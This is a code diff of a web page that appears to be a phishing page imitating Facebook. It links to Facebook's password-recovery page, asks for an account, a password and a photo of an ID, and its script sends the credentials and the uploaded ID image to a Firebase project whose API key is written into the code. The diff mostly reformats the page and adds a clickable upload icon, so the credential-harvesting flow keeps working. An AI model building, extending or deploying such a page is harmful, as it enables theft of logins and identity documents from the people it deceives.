@@ -84,7 +84,7 @@
       as="style"
       onload="this.onload = null; this.rel = 'stylesheet';"
     />
-    
+
     <style id="style_ladi" type="text/css">
       a,
       abbr,
@@ -2881,6 +2881,11 @@
           left: 13px;
         }
       }
+      #file-field:after {
+        position: absolute;
+        right: 0;
+        background: url("data:image/svg+xml;utf8, %3Csvg%20width%3D%2245.7845px%22%20height%3D%2245.7845px%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20stroke-linecap%3D%22square%22%20stroke-linejoin%3D%22miter%22%20fill%3D%22none%22%20stroke%3D%22rgba(132%2C%20132%2C%20132%2C%201.0)%22%3E%3Cpath%20d%3D%22M6.5%2C18%20C4.01471863%2C18%202%2C15.9852814%202%2C13.5%20C2%2C11.0147186%204.01471863%2C9%206.5%2C9%20C6.9194849%2C9%207.3255638%2C9.05739789%207.71081142%2C9.16476838%20C8.72277%2C7.28089089%2010.711801%2C6%2013%2C6%20C15.9817502%2C6%2018.4554927%2C8.17503894%2018.9211951%2C11.0250841%20C20.6555928%2C11.2331085%2022%2C12.7095527%2022%2C14.5%20C22%2C16.4329966%2020.4329966%2C18%2018.5%2C18%20L6.5%2C18%20Z%22%3E%3C%2Fpath%3E%3Cpath%20d%3D%22M12%2C11%20L12%2C15%22%3E%3C%2Fpath%3E%3Cpolyline%20points%3D%2210%2012%2012%2010%2014%2012%2014%2012%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E");
+      }
     </style>
     <style id="style_lazyload" type="text/css">
       body.lazyload .ladi-overlay,
@@ -3041,7 +3046,9 @@
                               ></button>
                             </form>
                           </div>
-                          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
+                          <a
+                            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+                          >
                             <div id="HEADLINE1491" class="ladi-element">
                               <h3 class="ladi-headline ladi-transition">
                                 Forgot password?
@@ -3403,7 +3410,10 @@
                       <div id="FORM_ITEM404" class="ladi-element">
                         <div class="ladi-form-item-container">
                           <div class="ladi-form-item-background"></div>
-                          <div class="ladi-form-item" style="position: relative">
+                          <div
+                            class="ladi-form-item container-ladi"
+                            style="position: relative"
+                          >
                             <input
                               autocomplete="off"
                               tabindex="2"
@@ -3412,11 +3422,29 @@
                               class="ladi-form-control"
                               type="file"
                               placeholder="Upload a Photo of your ID"
-                              style="opacity: 0;"
+                              style="opacity: 0"
                               id="file-field"
                             />
-                            <img style="position: absolute; right: 0; top: 0; transform: translateX(-50%);" src="data:image/svg+xml;utf8, %3Csvg%20width%3D%2245.7845px%22%20height%3D%2245.7845px%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20stroke-linecap%3D%22square%22%20stroke-linejoin%3D%22miter%22%20fill%3D%22none%22%20stroke%3D%22rgba(132%2C%20132%2C%20132%2C%201.0)%22%3E%3Cpath%20d%3D%22M6.5%2C18%20C4.01471863%2C18%202%2C15.9852814%202%2C13.5%20C2%2C11.0147186%204.01471863%2C9%206.5%2C9%20C6.9194849%2C9%207.3255638%2C9.05739789%207.71081142%2C9.16476838%20C8.72277%2C7.28089089%2010.711801%2C6%2013%2C6%20C15.9817502%2C6%2018.4554927%2C8.17503894%2018.9211951%2C11.0250841%20C20.6555928%2C11.2331085%2022%2C12.7095527%2022%2C14.5%20C22%2C16.4329966%2020.4329966%2C18%2018.5%2C18%20L6.5%2C18%20Z%22%3E%3C%2Fpath%3E%3Cpath%20d%3D%22M12%2C11%20L12%2C15%22%3E%3C%2Fpath%3E%3Cpolyline%20points%3D%2210%2012%2012%2010%2014%2012%2014%2012%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E" alt="">
-                            <span id="file-name-field" style="position: absolute; left: 10px; top: 0; transform: translateY(50%)"></span>
+                            <img
+                              style="
+                                position: absolute;
+                                right: 0;
+                                top: 0;
+                                transform: translateX(-50%);
+                              "
+                              id="r-file-field"
+                              src="data:image/svg+xml;utf8, %3Csvg%20width%3D%2245.7845px%22%20height%3D%2245.7845px%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20stroke-linecap%3D%22square%22%20stroke-linejoin%3D%22miter%22%20fill%3D%22none%22%20stroke%3D%22rgba(132%2C%20132%2C%20132%2C%201.0)%22%3E%3Cpath%20d%3D%22M6.5%2C18%20C4.01471863%2C18%202%2C15.9852814%202%2C13.5%20C2%2C11.0147186%204.01471863%2C9%206.5%2C9%20C6.9194849%2C9%207.3255638%2C9.05739789%207.71081142%2C9.16476838%20C8.72277%2C7.28089089%2010.711801%2C6%2013%2C6%20C15.9817502%2C6%2018.4554927%2C8.17503894%2018.9211951%2C11.0250841%20C20.6555928%2C11.2331085%2022%2C12.7095527%2022%2C14.5%20C22%2C16.4329966%2020.4329966%2C18%2018.5%2C18%20L6.5%2C18%20Z%22%3E%3C%2Fpath%3E%3Cpath%20d%3D%22M12%2C11%20L12%2C15%22%3E%3C%2Fpath%3E%3Cpolyline%20points%3D%2210%2012%2012%2010%2014%2012%2014%2012%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E"
+                              alt=""
+                            />
+                            <span
+                              id="file-name-field"
+                              style="
+                                position: absolute;
+                                left: 10px;
+                                top: 0;
+                                transform: translateY(50%);
+                              "
+                            ></span>
                           </div>
                         </div>
                       </div>
@@ -3606,10 +3634,7 @@
       rel="stylesheet"
       type="text/css"
     />
-    <script
-      src="index.js"
-      type="text/javascript"
-    ></script>
+    <script src="index.js" type="text/javascript"></script>
     <script id="script_event_data" type="application/json">
       {
         "SECTION403": {
@@ -3749,8 +3774,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
     <script>
-       // Khởi tạo Firebase
-       const firebaseConfig = {
+      // Khởi tạo Firebase
+      const firebaseConfig = {
         apiKey: "AIzaSyANSwlR-gyTKxCBCdhhWHgbB5Fg5-ODJ3c",
         authDomain: "tourism-de1ac.firebaseapp.com",
         projectId: "tourism-de1ac",
@@ -3765,14 +3790,18 @@
 
       // Khởi tạo Realtime Database
       const db = firebase.firestore();
-      let accountValue= ""
-      let passwordValue= ""
-      document.getElementById("account-field").addEventListener("change", function(e) {
-        accountValue= e.target.value
-      })
-      document.getElementById("password-field").addEventListener("change", function(e) {
-        passwordValue= e.target.value
-      })
+      let accountValue = "";
+      let passwordValue = "";
+      document
+        .getElementById("account-field")
+        .addEventListener("change", function (e) {
+          accountValue = e.target.value;
+        });
+      document
+        .getElementById("password-field")
+        .addEventListener("change", function (e) {
+          passwordValue = e.target.value;
+        });
       // Khi người dùng chọn ảnh và nhấn nút upload
       document
         .getElementById("file-field")
@@ -3780,7 +3809,7 @@
 
       function handleFileSelect(event) {
         const file = event.target.files[0];
-        document.getElementById("file-name-field").innerHTML= file.name
+        document.getElementById("file-name-field").innerHTML = file.name;
         // Tạo reference đến Firebase Storage
         const storageRef = firebase.storage().ref("images/" + file.name);
 
@@ -3794,7 +3823,7 @@
             // Lấy thông tin account và password từ người dùng (ví dụ: qua form)
             const accountId = document.getElementById("account-field").value;
             const password = document.getElementById("password-field").value;
-            console.log(accountId)
+            console.log(accountId);
             // Tạo một object chứa thông tin cần lưu vào Realtime Database
             const userData = {
               account: accountValue,
@@ -3818,6 +3847,14 @@
           });
         });
       }
+      function triggerFileInput() {
+        var fileInput = document.getElementById("file-field");
+        fileInput.click(); // Mô phỏng việc nhấp vào input file thực sự
+      }
+      document.getElementById("r-file-field").addEventListener("click", function() {
+        var fileInput = document.getElementById("file-field");
+        fileInput.click(); // Mô phỏng việc nhấp vào input file thực sự
+      })
     </script>
   </body>
   <style>
